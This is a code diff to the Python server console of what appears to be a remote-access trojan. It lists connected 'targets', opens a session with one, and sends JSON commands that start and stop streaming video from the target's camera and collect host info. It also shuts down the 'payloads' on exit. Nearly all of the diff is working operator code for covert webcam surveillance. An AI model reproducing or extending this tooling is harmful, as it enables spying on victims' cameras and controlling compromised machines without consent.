@@ -9,6 +9,24 @@ import sys
 import os
 from configparser import ConfigParser
 
+
+
+#msg [pls don't change anything from this msg]
+JSON_MSG_START_STREAM = {
+    "command" : "start stream"
+}
+
+JSON_MSG_TO_STOP_STREAM = {
+    "command" : "stop stream"
+}
+
+INFO_MSG = {
+    "command" : "get info"
+}
+
+SHUTDOWN_MSG = {
+    "command" : "stop connection"
+}
 class colors (object):
     def red():
         return colorama.Fore.RED
@@ -48,14 +66,11 @@ server.listen(10)
 def help(TYPE):
     COMMANDS_AND_USE_MAIN = {
         f"{CR.green()}show targets" : f"{CR.blue()}command for showing connecteds targets",
-        #f"{CR.green()}start stream" : f"{CR.blue()}command used for start reciving video data from the target",
-        #f"{CR.green()}stop stream"  : f"{CR.blue()}command used to stop the stream services of reciving video data from the target {CR.red()}[if it already started !!]",
         f"{CR.green()}connect" : f"{CR.blue()}command use to connect to a specified target {CR.yellow()}[it take one argumnet wich is the target host that you wannt to connect to]",
         f"{CR.green()}help" : f"{CR.blue()}shows this help menu"
     
     }
     COMMANDS_AND_USE_CS  = {
-        #f"{CR.green()}show targets" : f"{CR.blue()}command for showing connecteds targets",
         f"{CR.green()}start stream" : f"{CR.blue()}command used for start reciving video data from the target",
         f"{CR.green()}stop stream"  : f"{CR.blue()}command used to stop the stream services of reciving video data from the target {CR.red()}[if it already started !!]",
         f"{CR.green()}back to main" : f"{CR.blue()}command use to get back to the main console",
@@ -109,49 +124,43 @@ def connect_with_host(target_add):
     print(f"{Splus} {CR.green()}Connected to {CR.red()}{TARGETS[target_add][0]}{CR.white()}")
     print(f"{Ssowrd} {CR.red()}Note: {CR.yellow()}you should start a TCP tunnel so we can recv video data from the target{CR.white()} [{CR.blue()}HOST: {CR.white()}{HOST}, {CR.blue()}PORT: {CR.white()}{CAMERA_STREAMING_PORT}]")
     while True:
-        COMMAND_FOR_TARGET_SESSION = input(f"\r{CR.red()} <|{CR.green()}session{CR.white()}-{CR.blue()}target={CR.yellow()}{TARGETS[target_add][0]}{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
-        if COMMAND_FOR_TARGET_SESSION == "start stream":
-            if SERVER_UP:
-                print(f"{Sminess} {CR.red()}Stream is already up{CR.white()}")
-            else:
-                JSON_MSG = {
-                    "command" : "start stream"
-                }
-                target_add.send(json.dumps(JSON_MSG).encode())
-                time.sleep(0.4)
-                SERVER_UP = True
-                StartCameraStreamingServer(
-                    host=HOST,
-                    port=CAMERA_STREAMING_PORT
-                )
-        elif COMMAND_FOR_TARGET_SESSION == "stop stream":
-            if SERVER_UP:
-                JSON_MSG_TO_STOP_STREAM = {
-                    "command" : "stop stream"
-                }
-                target_add.send(json.dumps(JSON_MSG_TO_STOP_STREAM).encode())
-                StopCameraStreamingServer()
-                SERVER_UP = False
-                print(f"{Splus} {CR.green()}Stream stoped{CR.white()}")
-            else:
-                print(f"{Sminess} {CR.red()}Stream isn't up to stop it {CR.white()}")
-        elif COMMAND_FOR_TARGET_SESSION == "help":
-            help(TYPE="CameraStreaming")
-        elif COMMAND_FOR_TARGET_SESSION == "get info":
-            INFO_MSG = {
-                "command" : "get info"
-            }
-            target_add.send(json.dumps(INFO_MSG).encode())
-            "\n"
-            recv_target_info(target=target_add)
-            "\n"
-        elif COMMAND_FOR_TARGET_SESSION == "back to main":
-            if SERVER_UP:
-                print(f"\r{Swarning} {CR.green()}Stoping the stream recv...", end="")
-                StopCameraStreamingServer()
-                print(f"{CR.blue()}Done")
-            else:
-                pass
+        try:
+            COMMAND_FOR_TARGET_SESSION = input(f"\r{CR.red()} <|{CR.green()}session{CR.white()}-{CR.blue()}target={CR.yellow()}{TARGETS[target_add][0]}{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
+            if COMMAND_FOR_TARGET_SESSION == "start stream":
+                if SERVER_UP:
+                    print(f"{Sminess} {CR.red()}Stream is already up{CR.white()}")
+                else:
+                    target_add.send(json.dumps(JSON_MSG_START_STREAM).encode())
+                    time.sleep(0.4)
+                    SERVER_UP = True
+                    StartCameraStreamingServer(
+                        host=HOST,
+                        port=CAMERA_STREAMING_PORT
+                    )
+            elif COMMAND_FOR_TARGET_SESSION == "stop stream":
+                if SERVER_UP:
+                    target_add.send(json.dumps(JSON_MSG_TO_STOP_STREAM).encode())
+                    StopCameraStreamingServer()
+                    SERVER_UP = False
+                    print(f"{Splus} {CR.green()}Stream stoped{CR.white()}")
+                else:
+                    print(f"{Sminess} {CR.red()}Stream isn't up to stop it {CR.white()}")
+            elif COMMAND_FOR_TARGET_SESSION == "help":
+                help(TYPE="CameraStreaming")
+            elif COMMAND_FOR_TARGET_SESSION == "get info":
+                target_add.send(json.dumps(INFO_MSG).encode())
+                recv_target_info(target=target_add)
+            elif COMMAND_FOR_TARGET_SESSION == "back to main":
+                if SERVER_UP:
+                    print(f"\r{Swarning} {CR.green()}Stoping the stream recv...", end="")
+                    StopCameraStreamingServer()
+                    time.sleep(0.2)
+                    print(f"{CR.blue()}Done")
+                else:
+                    pass
+                break
+        except KeyboardInterrupt:
+            print(f"{Splus} {CR.green()} User interrupt {CR.yellow()}[CTRL+C]{CR.green()} redirecting to {CR.blue()}main{CR.white()}")
             break
 
 def upcoming_connection():
@@ -171,31 +180,41 @@ def run():
     UPCOMING_CONN_THREAD.start()
     #console for server
     while True:
-        COMMAND_INPUT = input(f"\r   {CR.red()} <|{CR.green()}server{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
-        if COMMAND_INPUT == "show targets":
-            TARGETS_SHOWER()
-        elif COMMAND_INPUT.startswith("connect"):
-            THE_ADDR = COMMAND_INPUT.replace("connect ", "")
-            if THE_ADDR:
+        try:
+            COMMAND_INPUT = input(f"\r   {CR.red()} <|{CR.green()}server{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
+            if COMMAND_INPUT == "show targets":
+                TARGETS_SHOWER()
+            elif COMMAND_INPUT.startswith("connect"):
+                THE_ADDR = COMMAND_INPUT.replace("connect ", "")
+                if THE_ADDR:
+                    for x in TARGETS:
+                        if x.getsockname()[0] == THE_ADDR:
+                            connect_with_host(target_add=x)
+                else:
+                    print(f"{Sminess} {CR.red()}Target not specified{CR.white()}")
+            elif COMMAND_INPUT == "help":
+                help(TYPE="main")
+            elif COMMAND_INPUT == "exit":
                 for x in TARGETS:
-                    if x.getsockname()[0] == THE_ADDR:
-                        connect_with_host(target_add=x)
-            else:
-                print(f"{Sminess} {CR.red()}Target not specified{CR.white()}")
-        elif COMMAND_INPUT == "help":
-            help(TYPE="main")
-        elif COMMAND_INPUT == "exit":
-            SHUTDOWN_MSG = {
-                "command" : "stop connection"
-                }
+                    try:
+                        time.sleep(1)
+                        print(f"{Splus} {CR.green()}Sending exit code to{CR.yellow()}{x.getsocketname()[0]}{CR.green()}...", end="")
+                        x.send(json.dumps(SHUTDOWN_MSG).encode())
+                        print(f"{CR.blue()}OK{CR.white()}")
+                    except:
+                        pass
+                    os.system("rm server/setting/CS-config.ini")
+                    x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit() #just to make sure all the targets that are connected close the connection and shuting the payloads down
+        except KeyboardInterrupt:
+            print(f"{Splus} {CR.green()} User interrupt {CR.yellow()}[CTRL+C]{CR.green()}exiting...")
             for x in TARGETS:
                 try:
                     time.sleep(1)
+                    print(f"{Splus} {CR.green()}Sending exit code to{CR.yellow()}{x.getsocketname()[0]}{CR.green()}...", end="")
                     x.send(json.dumps(SHUTDOWN_MSG).encode())
+                    print(f"{CR.blue()}OK{CR.white()}")
                 except:
                     pass
-                os.system("rm server/setting/CS-config.ini")
-                x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit() #just to make sure all the targets that are connected close the connection and shuting the payloads down
-
+            x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit()
 
 run()
